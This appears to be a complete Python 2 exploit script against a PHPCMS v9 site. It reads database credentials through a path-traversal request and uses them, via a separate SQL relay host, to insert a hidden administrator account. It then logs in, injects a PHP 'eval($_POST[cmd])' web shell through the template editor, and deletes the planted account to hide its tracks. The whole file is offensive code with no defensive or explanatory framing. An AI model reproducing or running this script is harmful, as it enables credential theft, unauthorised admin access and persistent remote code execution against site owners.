#coding: utf-8
'''
Created on 2012-8-1

@author: Return
'''
import urllib2,urllib,cookielib,sys,re

cookieFile  = 'tmp/cookieFile.dat'          #cookie保存的位置
codeFile    = 'tmp/code/code.png'           #验证码保存的位置
tmpltPahe   = 'tmp/templateTmpFile.html'    #获取到临时模版文件存放路径
PHPshell    = '<?php $shell = "<?php eval(\$_POST[cmd])?>"; file_put_contents("caches/cmd.php",$shell); ?>' #一句话
rHost       = 'http://192.168.0.198'    
sHost       = 'http://127.0.0.1/test/test.php';#sql服务端
header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
cookie = cookielib.LWPCookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
urllib2.install_opener(opener)


#===============================================================================
# wirteShell    写入shell
#===============================================================================
def wirteShell():
    print '准备写入Shell...'
    #获取验证码
    postData = {}
    postData = urllib.urlencode(postData)
    req = urllib2.Request(
                              url = rHost+'/api.php?op=checkcode&code_len=4&font_size=20&width=130&height=50&font_color=&background=',
                              data = postData,
                              headers = header
                              )
    
    open(codeFile,'wb').write(urllib2.urlopen(req).read()); #验证码写入本地
    cookie.save(cookieFile)
    
    print '请输入验证码:'
    
    codeNum = sys.stdin.readline()
    
    postData = {                #PostData
        'username':'fuckAndfuck',        
        'password':'creturn.com',
        'code':codeNum,
        'dosubmit':''
        }
    
    postData = urllib.urlencode(postData)
    req = urllib2.Request(
                              url = rHost+'/index.php?m=admin&c=index&a=login&dosubmit=1',
                              data = postData,
                              headers = header
                              )
    
    result = urllib2.urlopen(req).read()
    cookie.save(cookieFile)
    
    if len(re.findall("登录成功",result)):
        pc_hash = re.search("(?<=pc_hash=)(.+?)(?=\')",result).group() #获取pc_hash，因为v9每个操作都会进行验证pc_hash值
        print pc_hash
        postData = {}
        postData = urllib.urlencode(postData)
        req = urllib2.Request(
                              url = rHost+'/index.php?m=template&c=file&a=edit_file&style=default&dir=search&file=footer.html&pc_hash='+pc_hash,
                              data = postData,
                              headers = header
                              )
        result = urllib2.urlopen(req).read()
        templateTmp = re.search("(<te.*?>)((.|\n)*?)(<.*?>)",result).group(2)
        if templateTmp :
            open(tmpltPahe,'w').write(templateTmp)  #保存模版文件内容后面还要保存回去
        else:
            print '没找到匹配内容，可能不存在此模版！'
            exit()
        #提交模版内容替换成PHPshell的内容
        postData = {
                    'code':PHPshell,
                    'dosubmit':'提交',
                    'pc_hash':pc_hash}
        postData = urllib.urlencode(postData)
        req = urllib2.Request(
                              url = rHost+'/index.php?m=template&c=file&a=edit_file&style=default&dir=search&file=footer.html&pc_hash='+pc_hash,
                              data = postData,
                              headers = header
                              )
        result = urllib2.urlopen(req).read()
        urllib2.urlopen(rHost+'/index.php?m=search').read() #访问次路径生成shell
        #把原内容写入进去
        postData = {
                    'code':templateTmp,
                    'dosubmit':'提交',
                    'pc_hash':pc_hash}
        postData = urllib.urlencode(postData)
        req = urllib2.Request(
                              url = rHost+'/index.php?m=template&c=file&a=edit_file&style=default&dir=search&file=footer.html&pc_hash='+pc_hash,
                              data = postData,
                              headers = header
                              )
        result = urllib2.urlopen(req).read()
        print 'Shell 写入成功...'
    else:
        #这里进行错误处理，不一定是验证码，有可能密码，用户名错误
        print '验证码有误'
        wirteShell()

    
#===============================================================================
# getDataBasePwd    获取数据库帐号
#===============================================================================
def getDataBasePwd():   
    print '读取数据库信息...'
    info = {}
    expPath = rHost+'/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php'
    result = urllib2.urlopen(expPath).read()
    info['hostName'] = re.search("(?<='hostname' => ')(.*?)(?=',)",result).group()
    info['database'] = re.search("(?<='database' => ')(.*?)(?=',)",result).group()
    info['username'] = re.search("(?<='username' => ')(.*?)(?=',)",result).group()
    info['password'] = re.search("(?<='password' => ')(.*?)(?=',)",result).group()
    info['tablepre'] = re.search("(?<='tablepre' => ')(.*?)(?=',)",result).group()
    info['type'] = re.search("(?<='type' => ')(.*?)(?=',)",result).group()
    return info
def delUser():
    dbInfo = getDataBasePwd()
    print '删除创建用户...'
    tabPre = dbInfo['database']+'.'+dbInfo['tablepre'] 
    sql = "DELETE FROM "+tabPre+"admin WHERE "+tabPre+"admin.`username` = 'fuckAndfuck'"
    
    postData = {                #PostData
        'username':dbInfo['username'],        
        'password':dbInfo['password'],
        'host':dbInfo['hostName'],
        'sql':sql
        }
    postData = urllib.urlencode(postData)
    req = urllib2.Request(
                              url = sHost,
                              data = postData,
                              headers = header
                              )
    
    urllib2.urlopen(req).read()
def connectDatabase(): 
    dbInfo = getDataBasePwd()
    
    print '连接数据库...'
    tabPre = dbInfo['database']+'.'+dbInfo['tablepre'] 
    sql = "INSERT INTO "+tabPre+"admin("+tabPre+"admin.`username`,"+tabPre+"admin.`password`,"+tabPre+"admin.`roleid`,"+tabPre+"admin.`encrypt`) VALUES('fuckAndfuck','748b4dfa3a7159c1eb1baa46f222f9b8',1,'C6mB9p')"
    postData = {                #PostData
       'username':dbInfo['username'],        
        'password':dbInfo['password'],
        'host':dbInfo['hostName'],
        'sql':sql
        }
    postData = urllib.urlencode(postData)
    req = urllib2.Request(
                              url = sHost,
                              data = postData,
                              headers = header
                              )
    
    result = urllib2.urlopen(req).read()
    if result == '1':
        wirteShell()
        delUser()       #删除用户
    else:
        print '连接失败...\n',result
#===============================================================================
# main    入口函数
#===============================================================================
def main():    
    if connectDatabase():
        wirteShell()
if __name__ == "__main__":
    main()